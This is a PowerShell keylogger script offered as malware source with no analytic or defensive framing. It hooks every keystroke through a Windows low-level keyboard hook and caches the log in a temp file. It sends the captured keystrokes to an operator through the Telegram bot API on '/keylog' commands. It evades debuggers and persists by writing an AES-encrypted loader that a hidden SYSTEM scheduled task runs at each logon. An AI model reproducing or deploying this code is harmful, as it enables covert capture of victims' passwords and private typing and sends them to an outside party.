# keyloger_module.ps1
[Reflection.Assembly]::LoadWithPartialName('System.Security') | Out-Null

function Encrypt-AES128 {
    param([byte[]]$Data, [byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize = 128
    $aes.Key = $Key
    $aes.IV = New-Object byte[] 16
    $encryptor = $aes.CreateEncryptor()
    $encrypted = $encryptor.TransformFinalBlock($Data, 0, $Data.Length)
    return [Convert]::ToBase64String($encrypted)
}

function Decrypt-AES128 {
    param([string]$EncryptedData, [byte[]]$Key)
    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.KeySize = 128
    $aes.Key = $Key
    $aes.IV = New-Object byte[] 16
    $decryptor = $aes.CreateDecryptor()
    $data = [Convert]::FromBase64String($EncryptedData)
    $decrypted = $decryptor.TransformFinalBlock($Data, 0, $Data.Length)
    return [Text.Encoding]::UTF8.GetString($decrypted)
}

function Invoke-AntiDebug {
    $process = Get-Process -Id $PID
    if ($process.ProcessName -eq "powershell_ise") { exit }
    if ([System.Diagnostics.Debugger]::IsAttached) { exit }
    $wmi = Get-WmiObject -Query "SELECT * FROM Win32_Process WHERE ProcessId=$PID"
    if ($wmi.CommandLine -like "*NoProfile*") { exit }
}

function Register-KeyloggerHook {
    Add-Type -TypeDefinition @"
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

public class KeyLogger {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;
    private static string buffer = "";
    private static DateTime startTime;

    public static void Start() {
        startTime = DateTime.Now;
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc) {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule) {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
            int vkCode = Marshal.ReadInt32(lParam);
            Keys key = (Keys)vkCode;
            buffer += key.ToString() + " ";
            
            if (buffer.Length > 500) {
                SaveBuffer();
            }
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void SaveBuffer() {
        try {
            string logFile = Environment.GetEnvironmentVariable("TEMP") + "\\syslog.tmp";
            System.IO.File.AppendAllText(logFile, buffer);
            buffer = "";
        } catch { }
    }

    public static string GetLogData() {
        SaveBuffer();
        string logFile = Environment.GetEnvironmentVariable("TEMP") + "\\syslog.tmp";
        if (System.IO.File.Exists(logFile)) {
            string data = System.IO.File.ReadAllText(logFile);
            System.IO.File.Delete(logFile);
            return data;
        }
        return "";
    }

    public static TimeSpan GetRunningTime() {
        return DateTime.Now - startTime;
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook, LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}
"@
}

function Start-KeyloggerThread {
    $keyloggerThread = [PowerShell]::Create().AddScript({
        Register-KeyloggerHook
        [KeyLogger]::Start()
    })
    $keyloggerThread.BeginInvoke() | Out-Null
    return $keyloggerThread
}

function Send-KeylogData {
    param([string]$Token, [string]$ChatId, [int]$Hours)
    
    $logData = [KeyLogger]::GetLogData()
    if (![string]::IsNullOrEmpty($logData)) {
        $runningTime = [KeyLogger]::GetRunningTime()
        if ($runningTime.TotalHours -ge $Hours) {
            $message = "Keylogger data for last $Hours hours:`n$logData"
            Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/sendMessage" -Method Post -Body @{
                chat_id = $ChatId
                text = $message
            } | Out-Null
        }
    }
}

function Add-KeyloggerPersistence {
    $scriptContent = Get-Content $MyInvocation.MyCommand.Path -Raw
    $aesKey = New-Object byte[] 16
    (New-Object Security.Cryptography.RNGCryptoServiceProvider).GetBytes($aesKey)
    $encryptedScript = Encrypt-AES128 -Data ([Text.Encoding]::UTF8.GetBytes($scriptContent)) -Key $aesKey
    
    $loaderScript = @"
`$encryptedScript = '$encryptedScript'
`$aesKey = [byte[]]@($(($aesKey | ForEach-Object { $_ }) -join ','))
`$decrypted = Decrypt-AES128 -EncryptedData `$encryptedScript -Key `$aesKey
Invoke-Expression `$decrypted
"@
    
    $loaderPath = "$env:TEMP\system_loader.ps1"
    Set-Content -Path $loaderPath -Value $loaderScript -Force
    
    $taskAction = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$loaderPath`""
    $taskTrigger = New-ScheduledTaskTrigger -AtLogOn
    $taskPrincipal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
    $taskSettings = New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable
    $task = New-ScheduledTask -Action $taskAction -Trigger $taskTrigger -Principal $taskPrincipal -Settings $taskSettings
    Register-ScheduledTask -TaskName "SystemInputMonitor" -InputObject $task -Force
}

function Start-CommandListener {
    param([string]$Token, [string]$ChatId)
    
    $offset = 0
    while ($true) {
        try {
            Invoke-AntiDebug
            $updates = Invoke-RestMethod -Uri "https://api.telegram.org/bot$Token/getUpdates?offset=$($offset+1)&timeout=30" -Method Get
            foreach ($update in $updates.result) {
                $offset = $update.update_id
                if ($update.message.text -like "/keylog*") {
                    $hours = [int]($update.message.text -replace "/keylog\s*", "")
                    if ($hours -gt 0) {
                        Send-KeylogData -Token $Token -ChatId $ChatId -Hours $hours
                    }
                }
            }
        } catch { }
        Start-Sleep 10
    }
}

$configToken = "BOT_TOKEN"
$configChatId = "CHAT_ID"

Add-KeyloggerPersistence
Start-KeyloggerThread
Start-CommandListener -Token $configToken -ChatId $configChatId
